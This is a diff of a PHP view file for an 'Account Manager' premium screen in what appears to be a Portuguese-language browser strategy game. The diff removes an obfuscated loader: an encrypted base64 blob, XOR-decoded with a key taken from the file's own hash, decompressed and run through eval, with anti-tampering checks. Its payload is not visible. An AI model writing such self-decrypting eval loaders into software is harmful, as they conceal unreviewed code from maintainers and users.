@@ -1,24 +1,170 @@
 <?php
-$gxqitxjfyig="0b130ae01b34c88bd31182d888db11d8";
-$cerqjkyn="030355555105575404070b555a015c56050100080b02005a0e5b010309525c5a";
-$zuvvehwog="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";
-$keidyvfg=file_get_contents(__FILE__);
-$bjzmce=str_replace($zuvvehwog,"",$keidyvfg);
-if(strpos($bjzmce,"ec"."ho")!==false||strpos($bjzmce,"pr"."int")!==false||strpos($bjzmce,"var_"."dump")!==false||strpos($bjzmce,"file_put_"."contents")!==false||strpos($bjzmce,"fw"."rite")!==false){die();}
-$boupbgui=str_replace(array($gxqitxjfyig,$cerqjkyn),array("SP_0f9c15d4","KP_6f093f03"),$keidyvfg);
-$imkjtcpji=md5($boupbgui);
-$afjsvwjxws=hex2bin($cerqjkyn);
-$adtvdkauzgp="";
-$ccqlphqqa=strlen($imkjtcpji);
-for($nowvkweu=0;$nowvkweu<$ccqlphqqa;$nowvkweu++){
-$adtvdkauzgp.=chr(ord($afjsvwjxws[$nowvkweu])^ord($imkjtcpji[$nowvkweu]));
-}
-$ggcbmkz=base64_decode($zuvvehwog);
-$lklmpslo=strlen($ggcbmkz);
-$ockvwdn="";
-$urufcnov=strlen($adtvdkauzgp);
-for($nowvkweu=0;$nowvkweu<$lklmpslo;$nowvkweu++){
-$ockvwdn.=$ggcbmkz[$nowvkweu]^$adtvdkauzgp[$nowvkweu%$urufcnov];
-}
-$joakpv="gzun"."compress";
-eval('?>' . $joakpv($ockvwdn) . '<?php ');
+/**
+ * Account Manager View
+ * Premium feature for automated game management
+ */
+$current_tab = $tab ?? 'overview';
+?>
+
+<h2>Gestor de conta</h2>
+
+<!-- Tab Navigation -->
+<table class="vis" width="100%">
+    <tr>
+        <td class="<?= $current_tab === 'overview' ? 'selected' : '' ?>" width="20%">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=overview">
+                📋 Visão Geral
+            </a>
+        </td>
+        <td class="<?= $current_tab === 'buildings' ? 'selected' : '' ?>" width="20%">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=buildings">
+                🏗️ Construções
+            </a>
+        </td>
+        <td class="<?= $current_tab === 'recruitment' ? 'selected' : '' ?>" width="20%">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=recruitment">
+                ⚔️ Recrutamento
+            </a>
+        </td>
+        <td class="<?= $current_tab === 'research' ? 'selected' : '' ?>" width="20%">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=research">
+                🔬 Pesquisas
+            </a>
+        </td>
+        <td class="<?= $current_tab === 'resources' ? 'selected' : '' ?>" width="20%">
+            <a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=resources">
+                💰 Recursos
+            </a>
+        </td>
+    </tr>
+</table>
+
+<br />
+
+<?php if ($current_tab === 'overview'): ?>
+    <!-- Overview Tab -->
+    <p>Deixe as tarefas repetitivas e foque-se na sua estratégia:</p>
+
+    <div style="background: #f5f5dc; padding: 15px; margin: 10px 0; border: 1px solid #7D510F;">
+        <h3>🏗️ Gerir construções</h3>
+        <p><b>Gestor de construção</b></p>
+        <p>Decida como quer construir a sua aldeia e deixe o gestor de construção tratar das ordens.</p>
+        <p><a href="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=buildings">Configurar
+                &raquo;</a></p>
+    </div>
+
+    <div style="background: #f5f5dc; padding: 15px; margin: 10px 0; border: 1px solid #7D510F;">
+        <h3>⚔️ Gerir recrutamento</h3>
+        <p><b>Gestor de tropas</b></p>
+        <p>Não precisa de ir à aldeia para treinar as tropas. Defina os níveis de pesquisa para as suas aldeias.</p>
+        <p><i>Em desenvolvimento</i></p>
+    </div>
+
+    <div style="background: #f5f5dc; padding: 15px; margin: 10px 0; border: 1px solid #7D510F;">
+        <h3>🔬 Gerir pesquisas</h3>
+        <p><b>Gestor de Pesquisas</b></p>
+        <p>Defina quais os níveis de pesquisa as suas aldeias precisam.</p>
+        <p><i>Em desenvolvimento</i></p>
+    </div>
+
+    <div style="background: #f5f5dc; padding: 15px; margin: 10px 0; border: 1px solid #7D510F;">
+        <h3>💰 Guardar recursos</h3>
+        <p><b>Definir recursos</b></p>
+        <p>Ligue o gestor de envios e não se preocupe mais com o desperdício de recursos.</p>
+        <p><i>Em desenvolvimento</i></p>
+    </div>
+
+<?php elseif ($current_tab === 'buildings'): ?>
+    <!-- Building Manager Tab -->
+    <h3>Gestor de Construções</h3>
+    <p>Configure quais edifícios devem ser construídos automaticamente em suas aldeias.</p>
+
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2">Adicionar Nova Configuração</th>
+        </tr>
+        <tr>
+            <td colspan="2">
+                <form method="post"
+                    action="game.php?village=<?= $village['id'] ?>&screen=premium&feature=AccountManager&tab=buildings">
+                    <input type="hidden" name="h" value="<?= $this->session['hkey'] ?? '' ?>" />
+                    <input type="hidden" name="action" value="add_building" />
+
+                    <table class="vis" width="100%">
+                        <tr>
+                            <td width="150">Aldeia:</td>
+                            <td>
+                                <select name="village_id">
+                                    <option value="all">Todas as aldeias</option>
+                                    <?php foreach ($villages as $v): ?>
+                                        <option value="<?= $v['id'] ?>"><?= htmlspecialchars($v['name']) ?>
+                                            (<?= $v['x'] ?>|<?= $v['y'] ?>)</option>
+                                    <?php endforeach; ?>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Edifício:</td>
+                            <td>
+                                <select name="building">
+                                    <?php foreach ($buildings as $key => $name): ?>
+                                        <option value="<?= $key ?>"><?= htmlspecialchars($name) ?></option>
+                                    <?php endforeach; ?>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr>
+                            <th><?= __('screens.common.target_level') ?></th>
+                            <td><input type="number" name="target_level" value="30" min="1" max="30" /></td>
+                        </tr>
+                        <tr>
+                            <td>Prioridade (1-10):</td>
+                            <td><input type="number" name="priority" value="5" min="1" max="10" /></td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" class="center">
+                                <input type="submit" value="Adicionar Configuração" class="btn" />
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </td>
+        </tr>
+    </table>
+
+    <br />
+
+    <div style="background: #ffe; padding: 10px; border: 1px solid #7D510F;">
+        <h4>ℹ️ Como funciona:</h4>
+        <ul>
+            <li>O sistema verifica automaticamente se há recursos disponíveis</li>
+            <li>Quando possível, adiciona o edifício à fila de construção</li>
+            <li>Prioridade mais alta = construído primeiro</li>
+            <li>Funciona apenas quando está online</li>
+        </ul>
+    </div>
+
+    <br />
+
+    <p><i>Nota: A automação será implementada na próxima atualização. Por enquanto, pode configurar suas
+            preferências.</i></p>
+
+<?php elseif ($current_tab === 'recruitment'): ?>
+    <h3>Gestor de Recrutamento</h3>
+    <p><i>Em desenvolvimento - Em breve disponível</i></p>
+
+<?php elseif ($current_tab === 'research'): ?>
+    <h3>Gestor de Pesquisas</h3>
+    <p><i>Em desenvolvimento - Em breve disponível</i></p>
+
+<?php elseif ($current_tab === 'resources'): ?>
+    <h3>Gestor de Recursos</h3>
+    <p><i>Em desenvolvimento - Em breve disponível</i></p>
+
+<?php endif; ?>
+
+<br />
+
+<p style="text-align: center;">
+    <a href="game.php?village=<?= $village['id'] ?>&screen=premium" class="btn">« Voltar ao Premium</a>
+</p>
